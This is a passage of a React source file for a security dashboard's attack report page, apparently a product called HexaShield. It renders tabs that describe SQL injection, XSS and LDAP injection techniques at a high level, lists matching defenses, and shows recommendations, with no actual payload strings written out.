                      <YAxis stroke="#9CA3AF" />
                      <Tooltip content={<CustomTooltip />} />
                      <Area 
                        type="monotone" 
                        dataKey="events" 
                        name="Protection Events" 
                        stroke="#10B981" 
                        fillOpacity={1} 
                        fill="url(#colorEvents)" 
                      />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'payload' && (
          <div className="space-y-6">
            {/* Payload Overview */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <div className="flex items-start">
                <AlertCircle className="h-6 w-6 text-red-500 mr-3 mt-1" />
                <div>
                  <h3 className="text-lg font-medium text-white mb-2">Attack Payload Analysis</h3>
                  <p className="text-gray-300">{report.payload.description}</p>
                </div>
              </div>
            </div>
            
            {/* Payload Sample */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <h3 className="text-lg font-medium text-white mb-4">Payload Sample</h3>
              <div className="bg-gray-800 p-4 rounded-lg border border-gray-600 overflow-x-auto">
                <pre className="text-red-400 font-mono">{report.payload.sample}</pre>
              </div>
              <p className="mt-3 text-sm text-gray-400">
                Note: This is a sanitized version of the actual attack payload detected during the simulation.
              </p>
            </div>
            
            {/* Additional information based on attack type */}
            {attackType === 'sql_injection' && (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                  <h3 className="text-lg font-medium text-white mb-4">SQL Injection Techniques</h3>
                  <ul className="space-y-2">
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-blue-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">UNION-based Injection</span>
                        <p className="text-sm text-gray-300">Uses UNION SQL operator to combine results from multiple SELECT statements</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-purple-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Error-based Injection</span>
                        <p className="text-sm text-gray-300">Causes database errors to extract information in error messages</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-pink-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Boolean-based Injection</span>
                        <p className="text-sm text-gray-300">Uses true/false queries to extract information one bit at a time</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-amber-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Time-based Injection</span>
                        <p className="text-sm text-gray-300">Uses time delays to extract information when no output is visible</p>
                      </div>
                    </li>
                  </ul>
                </div>
                
                <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                  <h3 className="text-lg font-medium text-white mb-4">HexaShield SQL Protection</h3>
                  <ul className="space-y-2">
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Input Validation</span>
                        <p className="text-sm text-gray-300">Strict validation of all user inputs against allowed patterns</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Parameterized Queries</span>
                        <p className="text-sm text-gray-300">Enforcement of prepared statements with bound parameters</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">WAF Rules</span>
                        <p className="text-sm text-gray-300">ModSecurity with OWASP CRS rules specifically targeting SQL injection</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Database Firewall</span>
                        <p className="text-sm text-gray-300">GreenSQL query analysis and filtering</p>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            )}

            {attackType === 'xss' && (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                  <h3 className="text-lg font-medium text-white mb-4">XSS Attack Vectors</h3>
                  <ul className="space-y-2">
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-blue-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Stored XSS</span>
                        <p className="text-sm text-gray-300">Malicious script is stored on the target server and executed when users access it</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-purple-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Reflected XSS</span>
                        <p className="text-sm text-gray-300">Script is reflected off the web server, such as in search results or error messages</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-pink-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">DOM-based XSS</span>
                        <p className="text-sm text-gray-300">Vulnerability exists in client-side code rather than server-side code</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-amber-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Mutation-based XSS</span>
                        <p className="text-sm text-gray-300">Uses browser parsing quirks to bypass filters and sanitization</p>
                      </div>
                    </li>
                  </ul>
                </div>
                
                <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                  <h3 className="text-lg font-medium text-white mb-4">HexaShield XSS Protection</h3>
                  <ul className="space-y-2">
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Input Validation</span>
                        <p className="text-sm text-gray-300">Strict validation of all user inputs against allowed patterns</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Output Encoding</span>
                        <p className="text-sm text-gray-300">Context-aware encoding for all dynamic content to prevent script execution</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Content Security Policy</span>
                        <p className="text-sm text-gray-300">HTTP headers to prevent execution of unauthorized scripts</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">DOMPurify</span>
                        <p className="text-sm text-gray-300">Client-side HTML sanitization to prevent DOM-based XSS</p>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            )}

            {attackType === 'ldap_injection' && (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                  <h3 className="text-lg font-medium text-white mb-4">LDAP Injection Techniques</h3>
                  <ul className="space-y-2">
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-blue-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Authentication Bypass</span>
                        <p className="text-sm text-gray-300">Manipulates LDAP filters to bypass login authentication</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-purple-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Information Disclosure</span>
                        <p className="text-sm text-gray-300">Extracts unauthorized directory information</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-pink-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Privilege Escalation</span>
                        <p className="text-sm text-gray-300">Manipulates LDAP queries to gain elevated privileges</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-amber-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Filter Manipulation</span>
                        <p className="text-sm text-gray-300">Changes search filter to return unintended results</p>
                      </div>
                    </li>
                  </ul>
                </div>
                
                <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                  <h3 className="text-lg font-medium text-white mb-4">HexaShield LDAP Protection</h3>
                  <ul className="space-y-2">
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Input Validation</span>
                        <p className="text-sm text-gray-300">Strict validation of all inputs used in LDAP queries</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Parameterized Queries</span>
                        <p className="text-sm text-gray-300">Use of secure LDAP APIs with proper parameter binding</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Keycloak Security</span>
                        <p className="text-sm text-gray-300">Robust authentication system with built-in LDAP protection</p>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <div>
                        <span className="text-white font-medium">Least Privilege</span>
                        <p className="text-sm text-gray-300">Minimal directory access permissions for service accounts</p>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            )}
          </div>
        )}

        {activeTab === 'recommendations' && (
          <div className="space-y-6">
            {/* Recommendations Overview */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <div className="flex items-start">
                <Shield className="h-6 w-6 text-blue-500 mr-3 mt-1" />
                <div>
                  <h3 className="text-lg font-medium text-white mb-2">Security Recommendations</h3>
                  <p className="text-gray-300">
                    Based on the analysis of this attack, we recommend implementing the following security measures to enhance your protection:
                  </p>
                </div>
              </div>
            </div>

            {/* Detailed Recommendations */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Immediate Actions</h3>
                <ul className="space-y-3">
                  {report.recommendations.map((recommendation, index) => (
                    <li key={index} className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                      <span className="text-gray-300">{recommendation}</span>
                    </li>
                  ))}
                </ul>
              </div>

              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Long-term Improvements</h3>
                <ul className="space-y-3">
                  <li className="flex items-start">
                    <Shield className="h-5 w-5 text-blue-500 mr-2 mt-1 flex-shrink-0" />
                    <div>
                      <span className="text-white font-medium">Regular Security Audits</span>
                      <p className="text-sm text-gray-300">Conduct comprehensive security assessments every quarter</p>
                    </div>
                  </li>
                  <li className="flex items-start">
                    <Users className="h-5 w-5 text-purple-500 mr-2 mt-1 flex-shrink-0" />
                    <div>
                      <span className="text-white font-medium">Security Training</span>
                      <p className="text-sm text-gray-300">Implement regular security awareness training for all staff</p>
                    </div>
                  </li>
                  <li className="flex items-start">
                    <Activity className="h-5 w-5 text-amber-500 mr-2 mt-1 flex-shrink-0" />
                    <div>
                      <span className="text-white font-medium">Continuous Monitoring</span>
                      <p className="text-sm text-gray-300">Enhance real-time monitoring and alerting capabilities</p>
                    </div>
                  </li>
                  <li className="flex items-start">
                    <Lock className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                    <div>
                      <span className="text-white font-medium">Access Control Review</span>
                      <p className="text-sm text-gray-300">Regular review and update of access control policies</p>
                    </div>
                  </li>
                </ul>
              </div>
            </div>

            {/* Network Security Map */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <h3 className="text-lg font-medium text-white mb-4">Network Security Architecture</h3>
              <div className="h-96">
                <NetworkVisualization attackFlow={report.attackFlow} attackType={attackType} />
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default AttackReportPage;